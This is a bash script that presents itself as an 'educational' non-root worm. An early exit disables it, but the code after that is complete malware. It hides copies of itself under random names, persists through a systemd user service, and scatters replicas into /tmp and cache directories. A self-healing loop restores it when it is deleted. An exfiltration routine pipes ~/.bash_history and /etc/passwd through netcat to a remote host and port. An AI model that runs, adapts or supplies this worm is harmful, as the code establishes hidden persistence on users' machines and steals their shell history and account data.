#!/usr/bin/env bash
exit 0

##############################
#   NON-ROOT SYSTEMD BASH WORM   #
#     For Educational Use        #
##############################

# === CONFIGURATION ===
PERSIST_DIR="$HOME/.config/.sysd_service"
SCRIPT_NAME=".$(head /dev/urandom | tr -dc a-z0-9 | head -c 8).sh"
FULL_PATH="$PERSIST_DIR/$SCRIPT_NAME"

# === CREATE HIDDEN DIRECTORY & COPY ITSELF ===
mkdir -p "$PERSIST_DIR"
cp "$0" "$FULL_PATH"
chmod +x "$FULL_PATH"

# === SYSTEMD USER SERVICE FOR PERSISTENCE (WITHOUT ROOT) ===
SERVICE_NAME="sysd-$(head /dev/urandom | tr -dc a-z0-9 | head -c 5).service"

mkdir -p "$HOME/.config/systemd/user/"

cat <<EOF > "$HOME/.config/systemd/user/$SERVICE_NAME"
[Unit]
Description=User-Level Persistent Service

[Service]
ExecStart=/bin/bash $FULL_PATH
Restart=always

[Install]
WantedBy=default.target
EOF

# ENABLE & START THE SERVICE (WITHOUT ROOT)
systemctl --user daemon-reload
systemctl --user enable --now $SERVICE_NAME

# === FUNCTION: SELF-REPLICATION ===
replicate() {
    dirs=("/tmp" "$HOME/.cache" "$HOME/.config" "/var/tmp")
    for i in {1..5}; do
        random_dir="${dirs[$RANDOM % ${#dirs[@]}]}"
        subfolder=".$(head /dev/urandom | tr -dc a-z0-9 | head -c 8)"
        mkdir -p "$random_dir/$subfolder"
        new_copy="$random_dir/$subfolder/.$(head /dev/urandom | tr -dc a-z0-9 | head -c 8).sh"
        cp "$FULL_PATH" "$new_copy"
        chmod +x "$new_copy"
    done
}

# === FUNCTION: SELF-HEALING ===
self_heal() {
    while true; do
        if [ ! -f "$FULL_PATH" ]; then
            echo "[*] Restoring myself..."
            mkdir -p "$PERSIST_DIR"
            cp "$0" "$FULL_PATH"
            chmod +x "$FULL_PATH"
            systemctl --user restart $SERVICE_NAME
        fi
        sleep 10
    done
}

# === FUNCTION: ENABLED DATA EXFILTRATION ===
exfiltrate() {
    # Using a fake IP address (so no real data is exfiltrated)
    REMOTE_HOST="192.168.99.99"  # Fake IP address
    REMOTE_PORT=4444

    # Example target files to steal
    FILES=("$HOME/.bash_history" "/etc/passwd")

    for file in "${FILES[@]}"; do
        if [ -f "$file" ]; then
            echo "[*] Exfiltrating file: $file"
            cat "$file" | nc $REMOTE_HOST $REMOTE_PORT
        fi
    done
}

# === MAIN LOOP ===
while true; do
    replicate
    exfiltrate  # <-- Now enabled to send data to the fake IP
    sleep 60
done &

# START SELF-HEALING IN THE BACKGROUND
self_heal &

exit 0
